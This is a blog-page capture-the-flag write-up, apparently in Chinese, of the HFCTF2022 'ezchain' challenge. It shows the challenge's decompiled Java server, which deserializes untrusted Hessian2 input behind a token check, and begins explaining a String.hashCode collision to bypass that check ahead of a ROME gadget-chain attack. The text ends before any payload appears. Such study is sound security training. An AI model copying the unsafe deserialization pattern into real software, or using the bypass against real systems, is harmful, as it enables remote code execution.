@@ -1,0 +1,757 @@
+
+  <!DOCTYPE html>
+  <html lang="zh-CN"  >
+  <head>
+  <meta charset="utf-8">
+  
+
+  
+
+  
+
+  <script>window.REIMU_CONFIG = {};window.REIMU_CONFIG.icon_font = '4552607_bq08450reo';window.REIMU_CONFIG.clipboard_tips = {"success":"复制成功(*^▽^*)","fail":"复制失败 (ﾟ⊿ﾟ)ﾂ","copyright":{"enable":false,"count":50,"content":"本文版权：本博客所有文章除特别声明外，均采用 BY-NC-SA 许可协议。转载请注明出处！"}};window.REIMU_CONFIG.code_block = {"expand":true};</script>
+  
+  <title>
+    [HFCTF2022]ezchain |
+    
+    KL
+  </title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+  <link rel="preconnect" href="https://fonts.gstatic.com/" crossorigin><link rel="preload" as="style" href="https://fonts.googleapis.com/css?family=Mulish:400,400italic,700,700italic%7CNoto%20Serif%20SC:400,400italic,700,700italic&display=swap"><link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Mulish:400,400italic,700,700italic%7CNoto%20Serif%20SC:400,400italic,700,700italic&display=swap" media="print" onload="this.media&#x3D;&#39;all&#39;">
+  
+    <link rel="preload" href="//at.alicdn.com/t/c/font_4552607_bq08450reo.woff2" as="font" type="font/woff2" crossorigin="anonymous">
+  
+  
+    
+<link rel="stylesheet" href="/css/loader.css">
+
+  
+  
+    <meta name="description" content="猛攻！ 1234567891011121314151617181920212223242526272829docker-compose.ymlversion: &#x27;2.4&#x27;services:  nginx:    image: nginx:1.15    ports:      - &quot;0.0.0.0:8090:80&quot;    restart: always">
+<meta property="og:type" content="article">
+<meta property="og:title" content="[HFCTF2022]ezchain">
+<meta property="og:url" content="http://example.com/2025/08/01/[HFCTF2022]ezchain/index.html">
+<meta property="og:site_name" content="KL">
+<meta property="og:description" content="猛攻！ 1234567891011121314151617181920212223242526272829docker-compose.ymlversion: &#x27;2.4&#x27;services:  nginx:    image: nginx:1.15    ports:      - &quot;0.0.0.0:8090:80&quot;    restart: always">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://example.com/2025/08/01/images/%E5%9B%BE%E7%89%87-120.png">
+<meta property="og:image" content="http://example.com/2025/08/01/images/image123434334.png">
+<meta property="og:image" content="http://example.com/2025/08/01/images/image123513031.png">
+<meta property="og:image" content="http://example.com/2025/08/01/images/image124414206.png">
+<meta property="og:image" content="http://example.com/2025/08/01/images/image131825975.png">
+<meta property="article:published_time" content="2025-08-01T04:04:47.000Z">
+<meta property="article:modified_time" content="2025-08-01T07:43:31.378Z">
+<meta property="article:author" content="FuB0Y">
+<meta property="article:tag" content="JAVA安全">
+<meta property="article:tag" content="Hessian2+rome反序列化">
+<meta property="article:tag" content="SignedObject二次反序列化">
+<meta property="article:tag" content="JAVA内存马">
+<meta property="article:tag" content="HashCode生成">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/2025/08/01/images/%E5%9B%BE%E7%89%87-120.png">
+  
+  
+    <link rel="alternate" href="/atom.xml" title="KL" type="application/atom+xml">
+  
+  
+    <link rel="shortcut icon" href="/images/favicon.ico">
+  
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  <link rel="preload" href="https://npm.webcache.cn/photoswipe@5.4.4/dist/photoswipe.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+  
+    
+      
+        
+<link rel="stylesheet" href="https://npm.webcache.cn/katex@0.16.11/dist/katex.min.css">
+
+      
+    
+  
+  
+  
+  
+    
+<script src="https://npm.webcache.cn/pace-js@1.2.4/pace.min.js" integrity="sha384-k6YtvFUEIuEFBdrLKJ3YAUbBki333tj1CSUisai5Cswsg9wcLNaPzsTHDswp4Az8" crossorigin="anonymous"></script>
+
+  
+  
+    
+<link rel="stylesheet" href="https://npm.webcache.cn/@reimujs/aos@0.1.0/dist/aos.css">
+
+  
+  
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+  <body>
+    
+  <div id='loader'>
+    <div class="loading-left-bg loading-bg"></div>
+    <div class="loading-right-bg loading-bg"></div>
+    <div class="spinner-box">
+      <div class="loading-taichi">
+        
+          <svg width="150" height="150" viewBox="0 0 1024 1024" class="icon" version="1.1" xmlns="https://www.w3.org/2000/svg" shape-rendering="geometricPrecision">
+            <path d="M303.5 432A80 80 0 0 1 291.5 592A80 80 0 0 1 303.5 432z" fill="var(--red-1, #ff5252)" />
+            <path d="M512 65A447 447 0 0 1 512 959L512 929A417 417 0 0 0 512 95A417 417 0 0 0 512 929L512 959A447 447 0 0 1 512 65z 
+           M512 95A417 417 0 0 1 929 512A208.5 208.5 0 0 1 720.5 720.5L720.5 592A80 80 0 0 0 720.5 432A80 80 0 0 0 720.5 592L720.5 720.5A208.5 208.5 0 0 1 512 512A208.5 208.5 0 0 0 303.5 303.5A208.5 208.5 0 0 0 95 512A417 417 0 0 1 512 95z" fill="var(--red-1, #ff5252)" />
+          </svg>
+        
+      </div>
+      <div class="loading-word">少女祈祷中...</div>
+    </div>
+  </div>
+  </div>
+  <script>
+    var time = null;
+    var startLoading = () => {
+      time = Date.now();
+      document.getElementById('loader').classList.remove("loading");
+    }
+    var endLoading = () => {
+      if (!time) {
+        document.body.style.overflow = 'auto';
+        document.getElementById('loader').classList.add("loading");
+      } else {
+        if (Date.now() - time > 500) {
+          time = null;
+          document.body.style.overflow = 'auto';
+          document.getElementById('loader').classList.add("loading");
+        } else {
+          setTimeout(endLoading, 500 - (Date.now() - time));
+          time = null;
+        }
+      }
+    }
+    window.addEventListener('DOMContentLoaded', endLoading);
+    document.getElementById('loader').addEventListener('click', endLoading);
+  </script>
+
+<div id="copy-tooltip" style="pointer-events: none; opacity: 0; transition: all 0.2s ease; position: fixed;top: 50%;left: 50%;z-index: 999;transform: translate(-50%, -50%);color: white;background: rgba(0, 0, 0, 0.5);padding: 10px 15px;border-radius: 10px;">
+</div>
+
+
+    <div id="container">
+      <div id="wrap">
+        <div id="header-nav">
+  <nav id="main-nav">
+    
+      
+        <span class="main-nav-link-wrap">
+          <div class="main-nav-icon icon rotate">
+            &#xe62b;
+          </div>
+          <a class="main-nav-link" href="/">首页</a>
+        </span>
+      
+        <span class="main-nav-link-wrap">
+          <div class="main-nav-icon icon rotate">
+            &#xe62b;
+          </div>
+          <a class="main-nav-link" href="/archives">归档</a>
+        </span>
+      
+        <span class="main-nav-link-wrap">
+          <div class="main-nav-icon icon rotate">
+            &#xe62b;
+          </div>
+          <a class="main-nav-link" href="/about">关于</a>
+        </span>
+      
+        <span class="main-nav-link-wrap">
+          <div class="main-nav-icon icon rotate">
+            &#xe62b;
+          </div>
+          <a class="main-nav-link" href="/friend">友链</a>
+        </span>
+      
+    
+    <a id="main-nav-toggle" class="nav-icon"></a>
+  </nav>
+  <nav id="sub-nav">
+    
+      <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS 订阅" target="_blank"></a>
+    
+    
+    
+  </nav>
+</div>
+<header id="header">
+  
+    <picture>
+      
+    </picture>
+    
+      <img fetchpriority="high" src="/images/banner.webp" alt="[HFCTF2022]ezchain">
+    
+  
+  <div id="header-outer">
+    <div id="header-title">
+      
+        
+        
+          <a href="/" id="logo">
+            <h1 data-aos="slide-up">[HFCTF2022]ezchain</h1>
+          </a>
+        
+      
+      
+        
+        <h2 id="subtitle-wrap" data-aos="slide-down">
+          
+        </h2>
+      
+    </div>
+  </div>
+</header>
+
+        <div id="content"  class="sidebar-right" >
+          <aside id="sidebar">
+  
+  
+  <div class="sidebar-wrapper wrap-sticky">
+    <div class="sidebar-wrap" data-aos="fade-up">
+      
+        <div class="sidebar-toc-sidebar"><div class="sidebar-toc">
+  <h3 class="toc-title">文章目录</h3>
+  <div class="sidebar-toc-wrapper toc-div-class" >
+      
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90"><span class="toc-number">1.</span> <span class="toc-text"> 源码分析</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%BB%95%E8%BF%87hash%E6%A3%80%E6%B5%8B"><span class="toc-number">2.</span> <span class="toc-text"> 绕过Hash检测</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%B3%95%E4%B8%80"><span class="toc-number">2.1.</span> <span class="toc-text"> 法一</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%B3%95%E4%BA%8C"><span class="toc-number">2.2.</span> <span class="toc-text"> 法二</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#hessian2%E4%BA%8C%E6%AC%A1%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96"><span class="toc-number">3.</span> <span class="toc-text"> Hessian2二次反序列化</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9E%84%E9%80%A0%E5%86%85%E5%AD%98%E9%A9%AC"><span class="toc-number">4.</span> <span class="toc-text"> 构造内存马</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%97%AE%E9%A2%98"><span class="toc-number">5.</span> <span class="toc-text"> 问题</span></a></li></ol>
+      
+  </div>
+</div>
+</div>
+        <div class="sidebar-common-sidebar hidden"><div class="sidebar-author">
+  <img data-src="/avatar/avatar.jpg" data-sizes="auto" alt="FuB0Y" class="lazyload">
+  <div class="sidebar-author-name">FuB0Y</div>
+  <div class="sidebar-description">世所谓英雄者，不以挫抑而灰心，不以失败而退怯</div>
+</div>
+<div class="sidebar-state">
+  <div class="sidebar-state-article">
+    <div>文章</div>
+    <div class="sidebar-state-number">396</div>
+  </div>
+  <div class="sidebar-state-category">
+    <div>分类</div>
+    <div class="sidebar-state-number">13</div>
+  </div>
+  <div class="sidebar-state-tag">
+    <div>标签</div>
+    <div class="sidebar-state-number">327</div>
+  </div>
+</div>
+<div class="sidebar-social">
+  
+</div>
+<div class="sidebar-menu">
+  
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/" aria-label="首页"></a>
+        <div class="sidebar-menu-icon icon rotate">
+          &#xe62b;
+        </div>
+        <div class="sidebar-menu-link">首页</div>
+      </div>
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/archives" aria-label="归档"></a>
+        <div class="sidebar-menu-icon icon rotate">
+          &#xe62b;
+        </div>
+        <div class="sidebar-menu-link">归档</div>
+      </div>
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/about" aria-label="关于"></a>
+        <div class="sidebar-menu-icon icon rotate">
+          &#xe62b;
+        </div>
+        <div class="sidebar-menu-link">关于</div>
+      </div>
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/friend" aria-label="友链"></a>
+        <div class="sidebar-menu-icon icon rotate">
+          &#xe62b;
+        </div>
+        <div class="sidebar-menu-link">友链</div>
+      </div>
+    
+  
+</div>
+</div>
+      
+      
+        <div class="sidebar-btn-wrapper" style="position:static">
+          <div class="sidebar-toc-btn current"></div>
+          <div class="sidebar-common-btn"></div>
+        </div>
+      
+    </div>
+  </div>
+
+  <div class="sidebar-widget">
+  
+  </div>
+</aside>
+
+          <section id="main"><article id="post-[HFCTF2022]ezchain" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-inner" data-aos="fade-up">
+    <div class="article-meta">
+      <div class="article-date">
+  <a href="/2025/08/01/%5BHFCTF2022%5Dezchain/" class="article-date-link" data-aos="zoom-in">
+    <time datetime="2025-08-01T04:04:47.000Z" itemprop="datePublished">2025-08-01</time>
+    <time style="display: none;" id="post-update-time">2025-08-01</time>
+  </a>
+</div>
+
+      
+  <div class="article-category">
+    <a class="article-category-link" href="/categories/%E5%88%B7%E9%A2%98/" data-aos="zoom-in">刷题</a>
+  </div>
+
+
+    </div>
+    <div class="hr-line"></div>
+    
+
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+      
+        <p>猛攻！</p>
+<figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">docker-compose.yml</span></span><br><span class="line"></span><br><span class="line"><span class="attr">version:</span> <span class="string">&#x27;2.4&#x27;</span></span><br><span class="line"><span class="attr">services:</span></span><br><span class="line">  <span class="attr">nginx:</span></span><br><span class="line">    <span class="attr">image:</span> <span class="string">nginx:1.15</span></span><br><span class="line">    <span class="attr">ports:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">&quot;0.0.0.0:8090:80&quot;</span></span><br><span class="line">    <span class="attr">restart:</span> <span class="string">always</span></span><br><span class="line">    <span class="attr">volumes:</span></span><br><span class="line">        <span class="bullet">-</span> <span class="string">./nginx.conf:/etc/nginx/conf.d/default.conf:ro</span></span><br><span class="line">    <span class="attr">networks:</span> <span class="comment">#加入的网络</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">internal_network</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">out_network</span></span><br><span class="line">  <span class="attr">web:</span></span><br><span class="line">    <span class="attr">build:</span> <span class="string">./</span></span><br><span class="line">    <span class="attr">restart:</span> <span class="string">always</span></span><br><span class="line">    <span class="attr">volumes:</span></span><br><span class="line">        <span class="bullet">-</span> <span class="string">./flag:/flag:ro</span></span><br><span class="line">    <span class="attr">networks:</span> <span class="comment">#加入的网络</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">internal_network</span></span><br><span class="line"><span class="attr">networks:</span> <span class="comment">#设置网络</span></span><br><span class="line">    <span class="attr">internal_network:</span></span><br><span class="line">        <span class="attr">internal:</span> <span class="literal">true</span> <span class="comment">#与外部隔离的网络,应该独立的网络</span></span><br><span class="line">        <span class="attr">ipam:</span></span><br><span class="line">            <span class="attr">driver:</span> <span class="string">default</span> <span class="comment">#默认桥接bridge</span></span><br><span class="line">    <span class="attr">out_network:</span></span><br><span class="line">        <span class="attr">ipam:</span></span><br><span class="line">            <span class="attr">driver:</span> <span class="string">default</span> <span class="comment">#默认桥接bridge</span></span><br></pre></td></tr></table></figure>
+<p>由此可知题目是不出网的</p>
+<p>题目给了jar包，反编译：</p>
+<p>index类：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// Source code recreated from a .class file by IntelliJ IDEA</span></span><br><span class="line"><span class="comment">// (powered by FernFlower decompiler)</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">package</span> com.ctf.ezchain;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.caucho.hessian.io.Hessian2Input;</span><br><span class="line"><span class="keyword">import</span> com.sun.net.httpserver.HttpExchange;</span><br><span class="line"><span class="keyword">import</span> com.sun.net.httpserver.HttpHandler;</span><br><span class="line"><span class="keyword">import</span> com.sun.net.httpserver.HttpServer;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.InputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.OutputStream;</span><br><span class="line"><span class="keyword">import</span> java.net.InetSocketAddress;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"><span class="keyword">import</span> java.util.Objects;</span><br><span class="line"><span class="keyword">import</span> java.util.concurrent.Executors;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Index</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;server start&quot;</span>);</span><br><span class="line">        <span class="type">HttpServer</span> <span class="variable">server</span> <span class="operator">=</span> HttpServer.create(<span class="keyword">new</span> <span class="title class_">InetSocketAddress</span>(<span class="number">8090</span>), <span class="number">0</span>);</span><br><span class="line">        server.createContext(<span class="string">&quot;/&quot;</span>, <span class="keyword">new</span> <span class="title class_">MyHandler</span>());</span><br><span class="line">        server.setExecutor(Executors.newCachedThreadPool());</span><br><span class="line">        server.start();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">static</span> <span class="keyword">class</span> <span class="title class_">MyHandler</span> <span class="keyword">implements</span> <span class="title class_">HttpHandler</span> &#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">handle</span><span class="params">(HttpExchange t)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">            <span class="type">String</span> <span class="variable">query</span> <span class="operator">=</span> t.getRequestURI().getQuery();</span><br><span class="line">            Map&lt;String, String&gt; queryMap = <span class="built_in">this</span>.queryToMap(query);</span><br><span class="line">            <span class="type">String</span> <span class="variable">response</span> <span class="operator">=</span> <span class="string">&quot;Welcome to HFCTF 2022&quot;</span>;</span><br><span class="line">            <span class="keyword">if</span> (queryMap != <span class="literal">null</span>) &#123;</span><br><span class="line">                <span class="type">String</span> <span class="variable">token</span> <span class="operator">=</span> (String)queryMap.get(<span class="string">&quot;token&quot;</span>);</span><br><span class="line">                <span class="type">String</span> <span class="variable">secret</span> <span class="operator">=</span> <span class="string">&quot;HFCTF2022&quot;</span>;</span><br><span class="line">                <span class="keyword">if</span> (Objects.hashCode(token) == secret.hashCode() &amp;&amp; !secret.equals(token)) &#123;</span><br><span class="line">                    <span class="type">InputStream</span> <span class="variable">is</span> <span class="operator">=</span> t.getRequestBody();</span><br><span class="line"></span><br><span class="line">                    <span class="keyword">try</span> &#123;</span><br><span class="line">                        <span class="type">Hessian2Input</span> <span class="variable">input</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Hessian2Input</span>(is);</span><br><span class="line">                        input.readObject();</span><br><span class="line">                    &#125; <span class="keyword">catch</span> (Exception var9) &#123;</span><br><span class="line">                        response = <span class="string">&quot;oops! something is wrong&quot;</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    response = <span class="string">&quot;your token is wrong&quot;</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            t.sendResponseHeaders(<span class="number">200</span>, (<span class="type">long</span>)response.length());</span><br><span class="line">            <span class="type">OutputStream</span> <span class="variable">os</span> <span class="operator">=</span> t.getResponseBody();</span><br><span class="line">            os.write(response.getBytes());</span><br><span class="line">            os.close();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> Map&lt;String, String&gt; <span class="title function_">queryToMap</span><span class="params">(String query)</span> &#123;</span><br><span class="line">            <span class="keyword">if</span> (query == <span class="literal">null</span>) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                Map&lt;String, String&gt; result = <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line"></span><br><span class="line">                <span class="keyword">for</span>(String param : query.split(<span class="string">&quot;&amp;&quot;</span>)) &#123;</span><br><span class="line">                    String[] entry = param.split(<span class="string">&quot;=&quot;</span>);</span><br><span class="line">                    <span class="keyword">if</span> (entry.length &gt; <span class="number">1</span>) &#123;</span><br><span class="line">                        result.put(entry[<span class="number">0</span>], entry[<span class="number">1</span>]);</span><br><span class="line">                    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                        result.put(entry[<span class="number">0</span>], <span class="string">&quot;&quot;</span>);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">return</span> result;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>maven依赖：</p>
+<p><img src="../images/%E5%9B%BE%E7%89%87-120.png" alt="img" /></p>
+<p>很明显，是利用Hessian2反序列化打ROME链。</p>
+<h2 id="源码分析"><a class="markdownIt-Anchor" href="#源码分析"></a> 源码分析</h2>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">    System.out.println(<span class="string">&quot;server start&quot;</span>);</span><br><span class="line">    <span class="comment">// 创建HTTP服务器实例</span></span><br><span class="line">	<span class="comment">// 参数1：绑定到本地8090端口</span></span><br><span class="line">	<span class="comment">// 参数2：backlog队列长度（0表示使用默认值）</span></span><br><span class="line">    <span class="type">HttpServer</span> <span class="variable">server</span> <span class="operator">=</span> HttpServer.create(<span class="keyword">new</span> <span class="title class_">InetSocketAddress</span>(<span class="number">8090</span>), <span class="number">0</span>);</span><br><span class="line">    <span class="comment">// 使用自定义的MyHandler处理请求</span></span><br><span class="line">    server.createContext(<span class="string">&quot;/&quot;</span>, <span class="keyword">new</span> <span class="title class_">Index</span>.MyHandler());</span><br><span class="line">    <span class="comment">// 设置线程池（使用可缓存线程池）</span></span><br><span class="line">    server.setExecutor(Executors.newCachedThreadPool());</span><br><span class="line">    server.start();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>然后后面就是一个自定义HTTP请求处理器</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 获取请求的查询字符串</span></span><br><span class="line">            <span class="type">String</span> <span class="variable">query</span> <span class="operator">=</span> t.getRequestURI().getQuery();</span><br><span class="line">            <span class="comment">// 将查询字符串转换为Map</span></span><br><span class="line">            Map&lt;String, String&gt; queryMap = <span class="built_in">this</span>.queryToMap(query);</span><br><span class="line">            <span class="type">String</span> <span class="variable">response</span> <span class="operator">=</span> <span class="string">&quot;Welcome to HFCTF 2022&quot;</span>;  <span class="comment">// 默认响应</span></span><br><span class="line">            </span><br><span class="line">            <span class="keyword">if</span> (queryMap != <span class="literal">null</span>) &#123;</span><br><span class="line">                <span class="comment">// 从查询参数中获取token</span></span><br><span class="line">                <span class="type">String</span> <span class="variable">token</span> <span class="operator">=</span> (String)queryMap.get(<span class="string">&quot;token&quot;</span>);</span><br><span class="line">                <span class="type">String</span> <span class="variable">secret</span> <span class="operator">=</span> <span class="string">&quot;HFCTF2022&quot;</span>;  <span class="comment">// 预设的密钥</span></span><br><span class="line">                </span><br><span class="line">                <span class="comment">// 检查token的哈希值是否与secret相同，但值不同（哈希碰撞攻击点）</span></span><br><span class="line">                <span class="keyword">if</span> (Objects.hashCode(token) == secret.hashCode() &amp;&amp; !secret.equals(token)) &#123;</span><br><span class="line">                    <span class="type">InputStream</span> <span class="variable">is</span> <span class="operator">=</span> t.getRequestBody();  <span class="comment">// 获取请求体输入流</span></span><br><span class="line">                    </span><br><span class="line">                    <span class="keyword">try</span> &#123;</span><br><span class="line">                        <span class="comment">// 尝试用Hessian反序列化输入流</span></span><br><span class="line">                        <span class="type">Hessian2Input</span> <span class="variable">input</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Hessian2Input</span>(is);</span><br><span class="line">                        input.readObject();  <span class="comment">// 读取反序列化对象</span></span><br><span class="line">                    &#125; <span class="keyword">catch</span> (Exception var9) &#123;</span><br><span class="line">                        response = <span class="string">&quot;oops! something is wrong&quot;</span>;  <span class="comment">// 反序列化失败响应</span></span><br><span class="line">                    &#125;</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    response = <span class="string">&quot;your token is wrong&quot;</span>;  <span class="comment">// token验证失败响应</span></span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br></pre></td></tr></table></figure>
+<p>这里要求我们找到一个和字符串<code>HFCTF2022</code>不相等但是Hashcode相等的字符串。在此之前我们先来看看String类的Hashcode是如何被计算出来的</p>
+<h2 id="绕过hash检测"><a class="markdownIt-Anchor" href="#绕过hash检测"></a> 绕过Hash检测</h2>
+<h3 id="法一"><a class="markdownIt-Anchor" href="#法一"></a> 法一</h3>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="type">int</span> hash; <span class="comment">// Default to 0</span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">public</span> <span class="type">int</span> <span class="title function_">hashCode</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">h</span> <span class="operator">=</span> hash;</span><br><span class="line">        <span class="keyword">if</span> (h == <span class="number">0</span> &amp;&amp; value.length &gt; <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="type">char</span> val[] = value;</span><br><span class="line"> </span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; value.length; i++) &#123;</span><br><span class="line">                h = <span class="number">31</span> * h + val[i];</span><br><span class="line">            &#125;</span><br><span class="line">            hash = h;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> h;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+<p>计算的关键就是for循环中的<code>h = 31 * h + val[i]</code>，对字符串的每一个字符依次进行该运算。下面有几个例子</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//97</span></span><br><span class="line"><span class="string">&quot;a&quot;</span>.hashCode()</span><br><span class="line"> </span><br><span class="line"><span class="comment">//97*31+98=3105</span></span><br><span class="line"><span class="string">&quot;ab&quot;</span>.hahsCode()</span><br><span class="line"> </span><br><span class="line"><span class="comment">//3105*31+99=96354</span></span><br><span class="line"><span class="string">&quot;abc&quot;</span>.hashCode()</span><br></pre></td></tr></table></figure>
+<p>可以看到前面字符的hash值也会影响后续hash值，于是我们能够构造出如下等式</p>
